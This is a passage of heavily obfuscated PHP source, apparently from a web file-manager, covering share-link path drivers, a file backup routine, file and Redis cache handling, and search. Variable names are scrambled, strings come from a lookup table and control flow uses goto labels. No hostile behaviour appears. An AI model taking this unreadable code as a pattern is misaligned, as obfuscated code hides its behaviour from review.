Action($Šİµ¥İ[1395])->sharePathInfo($”€šª“, $¸í€¼Ğç, $º±¿ç©×); } public function infoFull($Ñ©ì¨×ì) { $§ºĞÜÒ =& $_SERVER[Õò”†—·]; $°³ú½Âñ = explode($§ºĞÜÒ[18], trim($Ñ©ì¨×ì, $§ºĞÜÒ[18])); if (count($°³ú½Âñ) > 1) { $Õ‘àÕ·½ = implode($§ºĞÜÒ[18], array_splice($°³ú½Âñ, 1)); $ö•”®¤ƒ = $this->model->pathInfoByPath($°³ú½Âñ[0], $Õ‘àÕ·½); if (!$ö•”®¤ƒ) { return !1; } $this->pathParse[$§ºĞÜÒ[1222]] = $ö•”®¤ƒ[$§ºĞÜÒ[194]]; } return $this->infoParse($Ñ©ì¨×ì); } public function listAll($«Ù•Ñãì) { $èíœöíÑ =& $_SERVER[Õò”†—·]; $ôß—Š¢ = IO::info($this->pathParse[$èíœöíÑ[97]]); if (!$ôß—Š¢) { return array(); } $Ÿâò—ùÔ = $this->model->listAll($«Ù•Ñãì); $õ¡ş¶´û = Model($èíœöíÑ[648])->getInfo($ôß—Š¢[$èíœöíÑ[649]]); foreach ($Ÿâò—ùÔ as &$Å†¼¾½§) { check_abort(); $Å†¼¾½§[$èíœöíÑ[100]] = Action($èíœöíÑ[1395])->_shareItemeParse($Å†¼¾½§[$èíœöíÑ[100]], $õ¡ş¶´û); } unset($Å†¼¾½§); return $Ÿâò—ùÔ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($õÌ˜Æı ) { $this->pathParse = $õÌ˜Æı ; $this->model = Model($_SERVER[Õò”†—·][1388]); } protected function infoParse($ŠÁï©°¼, $Œ¿Ÿš‚ = false, $£ÍµŠ—¯ = false) { $¿ÓŞéá´ =& $_SERVER[Õò”†—·]; return Action($¿ÓŞéá´[1228])->sharePathInfo($this->pathParse[$¿ÓŞéá´[97]], !0, $Œ¿Ÿš‚); } public function listPath($ÊÜŸÒô®, $âÎ¹Î×‘ = false) { $®ÂşˆíÎ =& $_SERVER[Õò”†—·]; $€ü¬öíá = parent::listPath($ÊÜŸÒô®, $âÎ¹Î×‘); if (!$€ü¬öíá) { return $€ü¬öíá; } if (is_array($€ü¬öíá[$®ÂşˆíÎ[1396]])) { $€ü¬öíá[$®ÂşˆíÎ[1396]] = Action($®ÂşˆíÎ[1228])->shareItemInfo($€ü¬öíá[$®ÂşˆíÎ[1396]]); } foreach ($€ü¬öíá as $“‰ûŸ©Ã => $…áÓı) { if (!in_array($“‰ûŸ©Ã, array($®ÂşˆíÎ[96], $®ÂşˆíÎ[95]))) { continue; } foreach ($…áÓı as $ºˆÀÍ => $Ú€ÔÌÜ÷) { $€ü¬öíá[$“‰ûŸ©Ã][$ºˆÀÍ] = Action($®ÂşˆíÎ[1228])->shareItemInfo($Ú€ÔÌÜ÷); } } return $€ü¬öíá; } public function listAll($°õ¹ò·«) { $Ëˆ®¨×¶ =& $_SERVER[Õò”†—·]; $‹±‘Öà’ = IO::info($this->pathParse[$Ëˆ®¨×¶[97]]); if (!$‹±‘Öà’) { return array(); } $íæàïè = $this->model->listAll($°õ¹ò·«); foreach ($íæàïè as &$í¦…¸³õ) { $í¦…¸³õ[$Ëˆ®¨×¶[100]] = Action($Ëˆ®¨×¶[1228])->shareItemInfo($í¦…¸³õ[$Ëˆ®¨×¶[100]]); } unset($í¦…¸³õ); return $íæàïè; } } class PathDriverDriverShareItem { public function __construct($•ÈàÍóõ) { $this->pathParse = $•ÈàÍóõ; } public function __call($¡úõ•Ê, $«ÒÄ½µÂ) { $ Ó‡Ì¿å =& $_SERVER[Õò”†—·]; if (method_exists($this, $¡úõ•Ê)) { return; } $ïä»Ò¶ã = call_user_func_array(array($ Ó‡Ì¿å[1397], $¡úõ•Ê), $«ÒÄ½µÂ); $ÚÓ±ŞÑİ = array($ Ó‡Ì¿å[1398], $ Ó‡Ì¿å[1399], $ Ó‡Ì¿å[1400], $ Ó‡Ì¿å[1401], $ Ó‡Ì¿å[602], $ Ó‡Ì¿å[604], $ Ó‡Ì¿å[1402], $ Ó‡Ì¿å[120], $ Ó‡Ì¿å[1403], $ Ó‡Ì¿å[1404]); if (in_array($¡úõ•Ê, $ÚÓ±ŞÑİ)) { $ïä»Ò¶ã = $this->getPathOuter($ïä»Ò¶ã); } return $ïä»Ò¶ã; } public function copy($Óª³Íñ, $£îÖø†í, $Â€„ô¢¸ = false, $µ®®îöÆ = false) { return $this->copyMove($Óª³Íñ, $£îÖø†í, $Â€„ô¢¸, $_SERVER[Õò”†—·][602], $µ®®îöÆ); } public function move($ßí‰íÂş, $Ç¦¯ç¢±, $¨¹ÅÙïº = false, $¼ßòúã‡ = false) { return $this->copyMove($ßí‰íÂş, $Ç¦¯ç¢±, $¨¹ÅÙïº, $_SERVER[Õò”†—·][604], $¼ßòúã‡); } private function copyMove($À•ïè±¨, $‚Í¡óê“, $¹Ò–íã¨, $äÑÏŠ€‰, $×÷Æñ»ê = false) { $äí¿é¾Ú =& $_SERVER[Õò”†—·]; $³‘ã¡îø = $‚Í¡óê“; $šúú‘Õ¦ = IO::driverMake($‚Í¡óê“); if ($šúú‘Õ¦->pathParse[$äí¿é¾Ú[1204]]) { $‚Í¡óê“ = $šúú‘Õ¦->pathParse[$äí¿é¾Ú[1204]]; } else { $‚Í¡óê“ = $³‘ã¡îø; } $ìµ÷İº = IO::copyMove($À•ïè±¨, $‚Í¡óê“, $¹Ò–íã¨, $äÑÏŠ€‰, $×÷Æñ»ê); $ìµ÷İº = $this->getPathOuter($ìµ÷İº); return $ìµ÷İº; } public function pathThis($»µ¡ûÛ‰) { return get_path_this($this->pathParse[$_SERVER[Õò”†—·][97]]); } public function pathFather($ßŒ­úí‚) { return get_path_father($this->pathParse[$_SERVER[Õò”†—·][97]]); } public function iconvSystem($şÒÖø¯) { return $şÒÖø¯; } protected function infoParse($ä©§“Ò‚, $ìœòáä = false) { $œç¢¼”— =& $_SERVER[Õò”†—·]; $µˆÍİÙ° = $this->pathParse[$œç¢¼”—[545]][$œç¢¼”—[1229]] . $this->pathParse[$œç¢¼”—[1222]]; if ($ìœòáä) { $¤æãŒçÈ = IO::infoWithChildren($µˆÍİÙ°); } else { $¤æãŒçÈ = IO::info($µˆÍİÙ°); } $­¦ˆÃ¹© = $this->pathParse[$œç¢¼”—[545]]; return Action($œç¢¼”—[1395])->_shareItemeParse($¤æãŒçÈ, $­¦ˆÃ¹©); } public function listAll($å¾­æ—) { $ÇíŸ±ÒÒ =& $_SERVER[Õò”†—·]; $¹ŠµÚ™ = IO::listAll($å¾­æ—); $äãà·—õ = rtrim($this->pathParse[$ÇíŸ±ÒÒ[545]][$ÇíŸ±ÒÒ[1229]], $ÇíŸ±ÒÒ[18]); foreach ($¹ŠµÚ™ as &$æèû˜¯š) { $æèû˜¯š[$ÇíŸ±ÒÒ[97]] = $this->pathDriver . $ÇíŸ±ÒÒ[18] . ltrim(substr($æèû˜¯š[$ÇíŸ±ÒÒ[97]], strlen($äãà·—õ)), $ÇíŸ±ÒÒ[18]); } unset($æèû˜¯š); return $¹ŠµÚ™; } public function listAllSimple($£¯åâ¹›, $ªşÄÊƒ = false) { $Ê—›¥äĞ =& $_SERVER[Õò”†—·]; $µŠŒ€°ƒ = $this->listAll($£¯åâ¹›); $Œ¯œ£¿Ë = $this->pathParse[$Ê—›¥äĞ[479]]; if (trim($Œ¯œ£¿Ë, $Ê—›¥äĞ[18]) == trim(get_path_father($Œ¯œ£¿Ë), $Ê—›¥äĞ[18])) { $ªşÄÊƒ = !0; } return IO::init($Ê—›¥äĞ[22])->listAllSimpleMake($µŠŒ€°ƒ, $Œ¯œ£¿Ë, $ªşÄÊƒ); } public function getPathOuter($Ò¡Šµ) { $…‚áÈàµ =& $_SERVER[Õò”†—·]; $Ïãıø ù = KodIO::parse($Ò¡Šµ); if ($Ïãıø ù[$…‚áÈàµ[43]] == KodIO::KOD_SHARE_ITEM) { return $Ïãıø ù[$…‚áÈàµ[97]]; } $ıÆ­¡‚ = KodIO::clear($Ò¡Šµ); $çê¸ÎÒ´ = KodIO::clear($this->pathParse[$…‚áÈàµ[545]][$…‚áÈàµ[1229]]); $ªÂÓÙÂ‹ = substr($ıÆ­¡‚, strlen($çê¸ÎÒ´)); if (substr($ıÆ­¡‚, 0, strlen($çê¸ÎÒ´)) != $çê¸ÎÒ´) { return !1; } return $this->pathParse[$…‚áÈàµ[1223]] . $…‚áÈàµ[18] . ltrim($ªÂÓÙÂ‹, $…‚áÈàµ[18]); } public function getType() { $¾ïµËÂÁ =& $_SERVER[Õò”†—·]; $àïŒì« = str_replace($¾ïµËÂÁ[87], $¾ïµËÂÁ[22], get_class($this)); return strtolower($àïŒì«); } public function isOsDriver($’ğíö¸) { return IO::isOsDriver($’ğíö¸); } public function info($ÉËÏÚ©‚) { return $this->infoParse($ÉËÏÚ©‚); } public function infoAuth($ö–³ìË) { return $this->infoParse($ö–³ìË); } public function infoWithChildren($“¸µ‚Å…) { return $this->infoParse($“¸µ‚Å…, !0); } public function infoFull($™Ò•ƒ”å) { return $this->infoParse($™Ò•ƒ”å); } } goto Fíç³íºÏÑ; A‹„ÁƒåØ²: class BackupFile { public function __construct() { } public function index() { $ïÍØÊ®§ = Backup::get(); $£÷Ù¹Áó = $ïÍØÊ®§[$_SERVER[Õò”†—·][353]][$_SERVER[Õò”†—·][231]][$_SERVER[Õò”†—·][525]]; $´‰¼¸Ö» = array($_SERVER[Õò”†—·][526] => array($_SERVER[Õò”†—·][857], $£÷Ù¹Áó), $_SERVER[Õò”†—·][858] => array($_SERVER[Õò”†—·][391], $ïÍØÊ®§[$_SERVER[Õò”†—·][802]])); $ŸßĞäï¾ = (int) Model($_SERVER[Õò”†—·][839])->where($´‰¼¸Ö»)->count($_SERVER[Õò”†—·][525]); $‰™‡ûë = (int) Model($_SERVER[Õò”†—·][839])->where($´‰¼¸Ö»)->sum($_SERVER[Õò”†—·][89]); $ëÒ‰Üœ› = new TaskFileTransfer($_SERVER[Õò”†—·][859], $_SERVER[Õò”†—·][833], $ŸßĞäï¾, LNG($_SERVER[Õò”†—·][834]) . $_SERVER[Õò”†—·][835] . LNG($_SERVER[Õò”†—·][860])); $ëÒ‰Üœ›->task[$_SERVER[Õò”†—·][814]] = $‰™‡ûë; $ü§åÈïù = array($_SERVER[Õò”†—·][861] => $ŸßĞäï¾, $_SERVER[Õò”†—·][862] => $‰™‡ûë, $_SERVER[Õò”†—·][863] => time()); Backup::set($ü§åÈïù); $×š‹¶èå = !0; $ş”İêÅ¿ = $this->storeIds(); $ÂÚş˜ßñ = 1; $Ş˜ûğ = 1000; $ú½““‹Å = $ºÖÇï„ = 0; $» ÓÍ¢Œ = array(); $—Ø†°÷É = $á­«¢Š¤ = 0; do { $¦îËÆµõ = $_SERVER[Õò”†—·][864]; $¿ğƒúØš = Model($_SERVER[Õò”†—·][839])->where($´‰¼¸Ö»)->field($¦îËÆµõ)->order($_SERVER[Õò”†—·][865])->selectPage($Ş˜ûğ, $ÂÚş˜ßñ); $—•óçÉ´ = !empty($¿ğƒúØš[$_SERVER[Õò”†—·][429]]) ? $¿ğƒúØš[$_SERVER[Õò”†—·][429]] : array(); foreach ($—•óçÉ´ as $ÅØ¯å) { if (!$this->_fileExist($ÅØ¯å, $» ÓÍ¢Œ, $ş”İêÅ¿)) { write_log("\146\x69\154\x65\x20\x6e\157\164\40\145\170\x69\163\164\56\x66\151\154\x65\x49\104\72{$ÅØ¯å[$_SERVER[Õò”†—·][525]]}\x2c\40\x70\141\x74\x68\x3a{$ÅØ¯å[$_SERVER[Õò”†—·][97]]}", $_SERVER[Õò”†—·][866]); continue; } $‰ÒíÉê = $ÅØ¯å[$_SERVER[Õò”†—·][97]]; $ü†ØŞÍ = "\x7b\151\157\x3a{$ïÍØÊ®§[$_SERVER[Õò”†—·][802]]}\175" . substr($‰ÒíÉê, strlen("\x7b\151\157\72{$ÅØ¯å[$_SERVER[Õò”†—·][867]]}\175")); if (IO::exist($ü†ØŞÍ)) { $ëÒ‰Üœ›->updateFileEnd($ÅØ¯å[$_SERVER[Õò”†—·][42]], $ÅØ¯å[$_SERVER[Õò”†—·][89]]); } else { $ü†ØŞÍ = get_path_father($ü†ØŞÍ); IO::mkdir($ü†ØŞÍ); if (!IO::copy($‰ÒíÉê, $ü†ØŞÍ, $_SERVER[Õò”†—·][868])) { write_log($_SERVER[Õò”†—·][869] . $‰ÒíÉê . $_SERVER[Õò”†—·][853] . $ü†ØŞÍ . $_SERVER[Õò”†—·][178], $_SERVER[Õò”†—·][833]); $×š‹¶èå = !1; break; } } $£÷Ù¹Áó = $ÅØ¯å[$_SERVER[Õò”†—·][525]]; $ºÖÇï„ += 1; $ú½““‹Å += $ÅØ¯å[$_SERVER[Õò”†—·][89]]; $á­«¢Š¤ += 1; $—Ø†°÷É += $ÅØ¯å[$_SERVER[Õò”†—·][89]]; if ($ú½““‹Å >= 1024 * 1024 * 100) { $ü§åÈïù = array($_SERVER[Õò”†—·][870] => $£÷Ù¹Áó, $_SERVER[Õò”†—·][871] => $á­«¢Š¤, $_SERVER[Õò”†—·][872] => $—Ø†°÷É); Backup::set($ü§åÈïù); $ú½““‹Å = $ºÖÇï„ = 0; } } $ˆŞÍ÷‹ = count($—•óçÉ´); $ÂÚş˜ßñ++; } while ($ˆŞÍ÷‹ == $Ş˜ûğ); $ëÒ‰Üœ›->end(); $ü§åÈïù = array($_SERVER[Õò”†—·][873] => 1, $_SERVER[Õò”†—·][812] => time(), $_SERVER[Õò”†—·][826] => 1, $_SERVER[Õò”†—·][870] => $£÷Ù¹Áó, $_SERVER[Õò”†—·][874] => time()); if ($ºÖÇï„) { $ü§åÈïù[$_SERVER[Õò”†—·][871]] = $á­«¢Š¤; $ü§åÈïù[$_SERVER[Õò”†—·][872]] = $—Ø†°÷É; } Backup::set($ü§åÈïù); return !0; } private function _fileExist($‚Õ‘âÚØ, &$Ç¸¶§®›, $›”·¿ãñ) { $£Ã÷õº† =& $_SERVER[Õò”†—·]; $­ÖšÀÊ© = $‚Õ‘âÚØ[$£Ã÷õº†[97]]; if (in_array($‚Õ‘âÚØ[$£Ã÷õº†[525]], $Ç¸¶§®›)) { return !1; } if (!in_array($‚Õ‘âÚØ[$£Ã÷õº†[867]], $›”·¿ãñ)) { return !1; } if (IO::exist($­ÖšÀÊ©)) { return !0; } $Öâæ’§‰ = get_path_father($­ÖšÀÊ©); if (IO::exist($Öâæ’§‰)) { $Ç¸¶§®›[] = $‚Õ‘âÚØ[$£Ã÷õº†[525]]; return !1; } $ÈãòŸË™ = array($£Ã÷õº†[867] => $‚Õ‘âÚØ[$£Ã÷õº†[867]], $£Ã÷õº†[97] => array($£Ã÷õº†[443], "{$Öâæ’§‰}\x25")); $Ş…Ï§®è = Model($£Ã÷õº†[839])->where($ÈãòŸË™)->field($£Ã÷õº†[526])->select(); $Ç¸¶§®› = array_merge($Ç¸¶§®›, array_to_keyvalue($Ş…Ï§®è, $£Ã÷õº†[22], $£Ã÷õº†[525])); return !1; } private function _fileFilter($¡§Ò…‘Ñ) { $¶ˆƒô• =& $_SERVER[Õò”†—·]; return; if (empty($¡§Ò…‘Ñ)) { return; } $®é©ˆä = array($¶ˆƒô•[525] => array($¶ˆƒô•[17], array_unique($¡§Ò…‘Ñ))); $¯ƒÍ¯Ù™ = Model($¶ˆƒô•[875])->where($®é©ˆä)->field($¶ˆƒô•[194])->select(); foreach ($¯ƒÍ¯Ù™ as $æ°øÄ‘É) { Model($¶ˆƒô•[875])->remove($æ°øÄ‘É[$¶ˆƒô•[194]], !1); } } private function storeIds() { $¸á–¤ =& $_SERVER[Õò”†—·]; $®Ä¤˜Ş« = Model($¸á–¤[818])->listData(); $„ÄÉ“ç = array(); $Ÿ¾â²½ = $GLOBALS[$¸á–¤[16]][$¸á–¤[102]][$¸á–¤[876]]; foreach ($®Ä¤˜Ş« as $¾Ûş½¡‚) { $‡ àØÂ = strtolower($¾Ûş½¡‚[$¸á–¤[108]]); if (!isset($Ÿ¾â²½[$‡ àØÂ])) { continue; } $ƒ ø‹®Š = $¸á–¤[87] . (isset($Ÿ¾â²½[$‡ àØÂ]) ? $Ÿ¾â²½[$‡ àØÂ] : ucfirst($‡ àØÂ)); if (!class_exists($ƒ ø‹®Š)) { continue; } $„ÄÉ“ç[] = $¾Ûş½¡‚[$¸á–¤[459]]; } return $„ÄÉ“ç; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $åğÛûÂ =& $_SERVER[Õò”†—·]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ÇÜ«ëªƒ = $GLOBALS[$åğÛûÂ[16]][$åğÛûÂ[409]]; $É»æĞÃ = $ÇÜ«ëªƒ[$ÇÜ«ëªƒ[$åğÛûÂ[877]]]; $½èæáõë = $ÇÜ«ëªƒ[$åğÛûÂ[878]]; switch ($ÇÜ«ëªƒ[$åğÛûÂ[877]]) { case $åğÛûÂ[31]: self::$handle = Model($åğÛûÂ[879]); break; case $åğÛûÂ[880]: self::$handle = new CacheRedis($É»æĞÃ, $½èæáõë); break; case $åğÛûÂ[881]: self::$handle = new CacheMemcached($É»æĞÃ, $½èæáõë); break; case $åğÛûÂ[231]: self::$handle = new CacheFile($É»æĞÃ, $½èæáõë); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ò©ÖÅŒØ) { if (is_array($ò©ÖÅŒØ) || is_object($ò©ÖÅŒØ)) { $ò©ÖÅŒØ = json_encode($ò©ÖÅŒØ); } $ò©ÖÅŒØ = rawurlencode($ò©ÖÅŒØ); return md5(KOD_SITE_ID . $_SERVER[Õò”†—·][21] . $ò©ÖÅŒØ); } public static function get($†Ê¨³ï, $”§ş˜›µ = false) { $âŸ ÑÇâ = self::key($†Ê¨³ï); $ÏÇ¾é¢ù = self::init(); if ($”§ş˜›µ) { return unserialize($ÏÇ¾é¢ù->get($âŸ ÑÇâ)); } if (!isset(self::$memoryCache[$âŸ ÑÇâ])) { $¶»œëÌ = $ÏÇ¾é¢ù->get($âŸ ÑÇâ); self::$memoryCache[$âŸ ÑÇâ] = unserialize($¶»œëÌ); } return self::$memoryCache[$âŸ ÑÇâ]; } public static function set($Ä»Õ¦ö¿, $Ì¢Äµ’É, $œ©‰Ä†˜ = false) { $ØÚç¬ù =& $_SERVER[Õò”†—·]; $²Ñ¨÷† = self::key($Ä»Õ¦ö¿); if (isset(self::$memoryCache[$²Ñ¨÷†]) && self::$memoryCache[$²Ñ¨÷†] === $Ì¢Äµ’É) { return !0; } if ($œ©‰Ä†˜ === 0) { self::$memoryCache[$²Ñ¨÷†] = $Ì¢Äµ’É; return !0; } $¨Õö›œò = self::init(); $²İ‡Ïµğ = serialize($Ì¢Äµ’É); CacheLock::lock($Ä»Õ¦ö¿ . $ØÚç¬ù[882]); $›Ò¶÷º¬ = $¨Õö›œò->set($²Ñ¨÷†, $²İ‡Ïµğ, $œ©‰Ä†˜); self::$memoryCache[$²Ñ¨÷†] = $Ì¢Äµ’É; CacheLock::unlock($Ä»Õ¦ö¿ . $ØÚç¬ù[882]); return $›Ò¶÷º¬; } public static function getCall($‡‚öƒŸ‡, $ø×ŸÅûó, $Ñ¶ÅÒßé, $È˜ÆîçÌ = array()) { $ùĞ¥©¢¶ =& $_SERVER[Õò”†—·]; $ùõáÔúø = self::get($‡‚öƒŸ‡); if ($ùõáÔúø || $ùõáÔúø === $ùĞ¥©¢¶[22]) { return $ùõáÔúø; } $ùõáÔúø = call_user_func_array($Ñ¶ÅÒßé, $È˜ÆîçÌ); $ùõáÔúø = $ùõáÔúø ? $ùõáÔúø : $ùĞ¥©¢¶[22]; self::set($‡‚öƒŸ‡, $ùõáÔúø, $ø×ŸÅûó); return $ùõáÔúø; } public static function remove($ğëîˆõÛ) { $ª×”ñ±Ä = self::key($ğëîˆõÛ); unset(self::$memoryCache[$ª×”ñ±Ä]); self::clearTimeout(); CacheLock::lock($ğëîˆõÛ); $›ö¥¡¢ó = self::init()->remove($ª×”ñ±Ä); CacheLock::unlock($ğëîˆõÛ); return $›ö¥¡¢ó; } public static function removeMemory($ú•Ë¼Ù) { $ü¥ĞÑ¨ø = self::key($ú•Ë¼Ù); unset(self::$memoryCache[$ü¥ĞÑ¨ø]); } public static function clearMemory($“ïø¤¢’ = false) { if ($“ïø¤¢’) { $“ïø¤¢’ = self::key($“ïø¤¢’); unset(self::$memoryCache[$“ïø¤¢’]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Õò”†—·][883])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Õò”†—·][884])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($·Ñ—µÍ¿, $åçİÃº•) { $Ã¢Ôêú¿ =& $_SERVER[Õò”†—·]; $this->cachePath = $·Ñ—µÍ¿[$Ã¢Ôêú¿[97]]; $this->prefix = $Ã¢Ôêú¿[885]; $this->cacheTime = $åçİÃº•; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($·Ë“¤ÔØ) { $¢ò­í± =& $_SERVER[Õò”†—·]; $·Ë“¤ÔØ = str_replace(array($¢ò­í±[886], $¢ò­í±[110], $¢ò­í±[86]), $¢ò­í±[887], $·Ë“¤ÔØ); return $this->cachePath . $¢ò­í±[888] . $·Ë“¤ÔØ . $¢ò­í±[889]; } public function set($æ¼ìßåè, $Ìº¨ÊÖ©, $º€¸¯’è = false) { $º€¸¯’è = $º€¸¯’è ? $º€¸¯’è : $this->cacheTime; $ò¬— • = $this->getFile($æ¼ìßåè); if (file_put_contents($ò¬— •, $this->prefix . $Ìº¨ÊÖ©, LOCK_EX)) { @touch($ò¬— •, intval(time() + $º€¸¯’è)); clearstatcache(); return !0; } @unlink($ò¬— •); return !1; } public function get($úÏé¹”„) { $â×ÑÛÓü = $this->getFile($úÏé¹”„); if (file_exists($â×ÑÛÓü) && filemtime($â×ÑÛÓü) < time()) { @unlink($â×ÑÛÓü); return !1; } $Ğ£êªÎÒ = @file_get_contents($â×ÑÛÓü); return substr($Ğ£êªÎÒ, strlen($this->prefix)); } public function remove($øàÓà¾ù) { $§à×ı = $this->getFile($øàÓà¾ù); return @unlink($§à×ı); } public function deleteAll() { $¦Ì¢–Åü =& $_SERVER[Õò”†—·]; $„ÙŸåäø = scandir($this->cachePath); foreach ($„ÙŸåäø as $ş•İ÷â²) { $¬»·¬Ì = $this->cachePath . $ş•İ÷â²; if (strpos($¬»·¬Ì, $¦Ì¢–Åü[889]) && strpos($¬»·¬Ì, $¦Ì¢–Åü[890])) { @unlink($¬»·¬Ì); } } } public function clearTimeout() { $ê»°ƒÛÈ =& $_SERVER[Õò”†—·]; $‰£‰Ü¹Ğ = scandir($this->cachePath); foreach ($‰£‰Ü¹Ğ as $¼öÙ‘Àù) { $øÆì•‰á = $this->cachePath . $¼öÙ‘Àù; if (strpos($øÆì•‰á, $ê»°ƒÛÈ[889]) && strpos($øÆì•‰á, $ê»°ƒÛÈ[890]) && filemtime($øÆì•‰á) < time()) { @unlink($øÆì•‰á); } } } } goto Cõ¸Éßß²µ; c³ÅÆøŸ•: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¬æÉ‹š) { $÷¨¡ßé =& $_SERVER[Õò”†—·]; $‹ÏìÇèØ = KodIO::fileTypeList(); $ÏÜíåî® = $‹ÏìÇèØ[$¬æÉ‹š]; if (!$ÏÜíåî®) { return array(); } $µ§ë’çö = $ÏÜíåî®[$÷¨¡ßé[188]]; $ÄÁ¼¹¨Ä = $÷¨¡ßé[17]; if (!$ÏÜíåî®[$÷¨¡ßé[188]]) { $¦–„Âé… = array_to_keyvalue($‹ÏìÇèØ, $÷¨¡ßé[22], $÷¨¡ßé[188]); $µ§ë’çö = implode($÷¨¡ßé[60], $¦–„Âé…); $ÄÁ¼¹¨Ä = $÷¨¡ßé[2216]; } $÷‰ÛàÊ = explode($÷¨¡ßé[60], trim($µ§ë’çö, $÷¨¡ßé[60])); return array($ÄÁ¼¹¨Ä, $÷‰ÛàÊ); } public function listPathType($Ë¦şÂ×Ö) { $ï¿Õ›Ò÷ =& $_SERVER[Õò”†—·]; $ …Ë—ğ« = $this->fileTypeWhere($Ë¦şÂ×Ö); if (!$ …Ë—ğ«) { return array(); } $˜¶šë‰Æ = USER_ID; $éàê‰Ã· = Model($ï¿Õ›Ò÷[583])->getInfo($˜¶šë‰Æ); $ŒÚ×¤ = array($ï¿Õ›Ò÷[632] => SourceModel::TYPE_USER, $ï¿Õ›Ò÷[569] => array($ï¿Õ›Ò÷[596], $ï¿Õ›Ò÷[579] . $éàê‰Ã·[$ï¿Õ›Ò÷[100]][$ï¿Õ›Ò÷[194]] . $ï¿Õ›Ò÷[597]), $ï¿Õ›Ò÷[633] => $˜¶šë‰Æ, $ï¿Õ›Ò÷[630] => 0, $ï¿Õ›Ò÷[631] => $ …Ë—ğ«); return $this->listSource($ŒÚ×¤); } public function listSearch($ìâéöÍ, $©à×„Á¯ = 300) { $Ôä¨“Ñ =& $_SERVER[Õò”†—·]; if (isset($ìâéöÍ[$Ôä¨“Ñ[2052]]) && $ìâéöÍ[$Ôä¨“Ñ[2052]]) { $ìâéöÍ[$Ôä¨“Ñ[2052]] = str_replace($Ôä¨“Ñ[444], $Ôä¨“Ñ[2217], trim($ìâéöÍ[$Ôä¨“Ñ[2052]])); } $—†ï«Ó = $this->_parseSearchWhere($ìâéöÍ); if (!isset($—†ï«Ó[$Ôä¨“Ñ[489]])) { $—†ï«Ó[$Ôä¨“Ñ[489]] = 0; } $ï¥±´ = $Ôä¨“Ñ[2218]; $é®¥ ¦¿ = $—†ï«Ó; $ÈĞÑòËœ = $ï¥±´; $this->_listSearchBindPinyin($ìâéöÍ, $—†ï«Ó, $ï¥±´); $this->alias($Ôä¨“Ñ[503])->_makeOrder(); $—†ï«Ó = $this->parseWhereLike($—†ï«Ó); $åæ´Ü« = $this->distinct(!0)->field($ï¥±´)->where($—†ï«Ó)->selectPage($©à×„Á¯); if ($GLOBALS[$Ôä¨“Ñ[16]][$Ôä¨“Ñ[441]][$Ôä¨“Ñ[442]] && Input::check($ìâéöÍ[$Ôä¨“Ñ[2052]], $Ôä¨“Ñ[639]) && $åæ´Ü«[$Ôä¨“Ñ[426]][$Ôä¨“Ñ[413]] == 1 && $åæ´Ü«[$Ôä¨“Ñ[426]][$Ôä¨“Ñ[427]] == 0) { $åæ´Ü« = $this->distinct(!0)->field($ï¥±´)->where($é®¥ ¦¿)->limit(1000)->select(); $åæ´Ü« = array_page_split($åæ´Ü«, !1, $©à×„Á¯); } $this->_listSearchFileContent($åæ´Ü«, $ìâéöÍ, $ÈĞÑòËœ, $é®¥ ¦¿); $this->_listSearchDesc($åæ´Ü«, $ìâéöÍ, $ÈĞÑòËœ); $this->_listSearchTag($åæ´Ü«, $ìâéöÍ, $ÈĞÑòËœ); $this->_listSearchGroupTag($åæ´Ü«, $ìâéöÍ, $ÈĞÑòËœ); $this->_listDataApply($åæ´Ü«[$Ôä¨“Ñ[429]]); $this->_listMake($åæ´Ü«); return $åæ´Ü«; } private function _listSearchFileContent(&$åÚ¯ÚÔÍ, $ùìŠš¶û, $Ş¡€şÂ¨, $ĞÂÎôŒ‚) { $àË•êï‚ =& $_SERVER[Õò”†—·]; if (!$ùìŠš¶û[$àË•êï‚[2052]] || $åÚ¯ÚÔÍ[$àË•êï‚[426]][$àË•êï‚[413]] > 1) { return; } if (!isset($ĞÂÎôŒ‚[$àË•êï‚[42]]) || !is_array($ùìŠš¶û[$àË•êï‚[525]])) { return; } $ĞÂÎôŒ‚[$àË•êï‚[525]] = array($àË•êï‚[17], $ùìŠš¶û[$àË•êï‚[525]]); unset($ĞÂÎôŒ‚[$àË•êï‚[42]]); unset($ùìŠš¶û[$àË•êï‚[525]]); $’ø…ÇÌ = $this->field($Ş¡€şÂ¨)->where($ĞÂÎôŒ‚)->limit($àË•êï‚[2219])->select(); if (!$’ø…ÇÌ || count($’ø…ÇÌ) == 0) { return; } $åÚ¯ÚÔÍ[$àË•êï‚[429]] = array_merge($’ø…ÇÌ, $åÚ¯ÚÔÍ[$àË•êï‚[429]]); $åÚ¯ÚÔÍ[$àË•êï‚[426]][$àË•êï‚[427]] += count($’ø…ÇÌ); } private function _listSearchTag(&$ÌÎÁôä, $õ­üí¬ˆ, $²ò§¹€Ù) { $æĞÊ¤ =& $_SERVER[Õò”†—·]; if (!$õ­üí¬ˆ[$æĞÊ¤[2052]] || $ÌÎÁôä[$æĞÊ¤[426]][$æĞÊ¤[413]] > 1) { return; } $ô¼„íï = Model($æĞÊ¤[2220])->listData(); $á½‡“š = array(); $ĞœÌ½Ê¸ = $õ­üí¬ˆ[$æĞÊ¤[2052]]; foreach ($ô¼„íï as $Á´ãŞÒ­) { $±µ’‡«Ø = $Á´ãŞÒ­[$æĞÊ¤[42]]; $ïòªÄº = str_replace($æĞÊ¤[63], $æĞÊ¤[22], Pinyin::get($±µ’‡«Ø)); if (stripos($±µ’‡«Ø, $ĞœÌ½Ê¸) !== !1 || stripos($ïòªÄº, $ĞœÌ½Ê¸) !== !1) { $á½‡“š[] = $Á´ãŞÒ­[$æĞÊ¤[459]]; } } if (!$á½‡“š) { return; } $Ã©¤¨û“ = array($æĞÊ¤[484] => array($æĞÊ¤[17], $á½‡“š), $æĞÊ¤[1755] => USER_ID); $ÎÛº·Ôí = Model($æĞÊ¤[486])->field($æĞÊ¤[97])->where($Ã©¤¨û“)->select(); $ÎÛº·Ôí = 